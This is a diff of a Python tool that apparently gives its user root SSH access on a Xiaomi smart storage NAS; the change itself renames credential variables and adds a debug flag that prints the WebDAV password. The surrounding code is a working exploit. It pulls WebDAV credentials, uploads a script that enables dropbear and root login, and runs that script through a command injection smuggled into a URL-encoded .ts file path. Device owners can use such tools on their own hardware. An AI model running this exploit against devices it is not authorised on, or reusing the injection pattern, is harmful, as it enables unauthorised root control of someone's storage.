@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 小米智能存储一键开启 SSH，获取 root。
-pyinstaller --onefile --console minas_enable_ssh.py
+打包：pyinstaller --onefile --console minas_enable_ssh.py
 """
 
 import os
@@ -25,14 +25,15 @@ import paramiko
 import urllib3
 
 # ---------- 全局变量 ----------
+DEBUG = False
 NAS_IP = None
 CN = None
 CERT_HOME = None
 CA_FILE = None
 CERT_FILE = None
 KEY_FILE = None
-UNAME = None
-UPWD = None
+WDV_USER = None
+WDV_PWD = None
 PUB_KEY_OPENSSH = None
 
 # ---------- 证书和密钥工具 ----------
@@ -237,11 +238,13 @@ def get_webdav_creds():
         resp = session.post(url, json={}, timeout=10)
         resp.raise_for_status()
         data = resp.json()
-        uname = data['data']['webDAV']['username']
-        upwd = data['data']['webDAV']['password']
-        if uname and upwd:
-            print(f"WebDAV 凭证解析成功: {uname}")
-            return uname, upwd
+        wdv_user = data['data']['webDAV']['username']
+        wdv_pwd = data['data']['webDAV']['password']
+        if wdv_user and wdv_pwd:
+            print(f"WebDAV 凭证解析成功: {wdv_user}")
+            if DEBUG:
+                print(f"WebDAV 密码: {wdv_pwd}")
+            return wdv_user, wdv_pwd
         else:
             raise ValueError("响应中缺少username/password")
     except Exception as e:
@@ -299,9 +302,9 @@ usermod -s /bin/sh root #/usr/sbin/mi-shell
 systemctl enable dropbear.socket
 systemctl start dropbear.socket
 mitee_tool rpmb set ssh_en true
-touch /nas/pool0/{UNAME}/data/SUCCESS
-chown {UNAME}:{UNAME} /nas/pool0/{UNAME}/data/SUCCESS
-rm /nas/pool0/{UNAME}/data/enable-ssh.sh
+touch /nas/pool0/{WDV_USER}/data/SUCCESS
+chown {WDV_USER}:{WDV_USER} /nas/pool0/{WDV_USER}/data/SUCCESS
+rm /nas/pool0/{WDV_USER}/data/enable-ssh.sh
 '''
     script_path = Path(tempfile.gettempdir()) / "enable-ssh.sh"
     script_path.write_text(script, newline='\n')
@@ -312,7 +315,7 @@ def upload_script(script_path):
     """通过 WebDAV 上传脚本"""
     print("上传 enable-ssh.sh 脚本...")
     session = create_session()
-    session.auth = (UNAME, UPWD)
+    session.auth = (WDV_USER, WDV_PWD)
     url = f"https://{NAS_IP}:5000/pool0/data/enable-ssh.sh"
     with open(script_path, 'rb') as f:
         data = f.read()
@@ -332,9 +335,9 @@ def trigger_execute():
     """触发执行"""
     print("请求执行 enable-ssh.sh 脚本...")
     session = create_session()
-    session.auth = (UNAME, UPWD)
+    session.auth = (WDV_USER, WDV_PWD)
     # 构造特殊路径（URL编码）
-    path = f'/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57{UNAME}%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts'
+    path = f'/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57{WDV_USER}%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts'
     url = f"https://{NAS_IP}:5000{path}"
     try:
         session.get(url, timeout=10)
@@ -383,6 +386,9 @@ if __name__ == "__main__":
     print("################################################")
     print("小米智能存储一键开启 SSH + root    @Scruel 2026.08")
     print("################################################")
+    
+    if len(sys.argv) > 1 and sys.argv[1] == "--debug":
+        DEBUG = True
     NAS_IP = get_nas_ip()
     print(f"小米智能存储内网 IP: {NAS_IP}")
     # 如果自动扫描未获得CN，则单独获取
@@ -390,7 +396,7 @@ if __name__ == "__main__":
     # 2. 定位证书文件
     CERT_HOME, CA_FILE, CERT_FILE, KEY_FILE = prep_certfiles()
     # 3. 获取 WebDAV 凭证
-    UNAME, UPWD = get_webdav_creds()
+    WDV_USER, WDV_PWD = get_webdav_creds()
     # 4. 生成 SSH 密钥
     PUB_KEY_OPENSSH = generate_ssh_key()
     # 5. 创建并上传脚本
